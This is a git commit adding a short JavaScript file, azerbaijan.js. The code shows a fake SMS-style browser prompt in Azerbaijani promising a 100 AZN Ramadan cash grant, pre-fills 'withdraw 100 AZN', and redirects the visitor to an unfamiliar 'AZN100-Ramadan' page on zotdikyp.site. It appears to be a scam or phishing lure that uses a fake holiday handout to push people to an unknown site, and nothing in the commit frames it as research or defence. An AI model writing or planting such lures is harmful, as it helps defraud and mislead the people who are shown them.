e6b9d5f739ca96f57cd7d592b5eaa70e2f316bf4
newetijazz18 <newetijazz18@gmail.com>
2026-01-28 09:44:33 +0100

    Create azerbaijan.js

---
+++ azerbaijan.js
@@ -0,0 +1,5 @@
+var password = '100 AZN çıxarın'
+password=prompt('SMS: Bu ilki Ramazan bayramını qeyd etmək üçün 100 AZN məbləğində nağd pul qrantına xoş gəlmisiniz, Bu əla təklifi almaq üçün "OK" düyməsini basın..','100 AZN çıxarın');
+if (password != '100 AZN çıxarın') {
+location.href='https://www.zotdikyp.site/AZN100-Ramadan';
+}
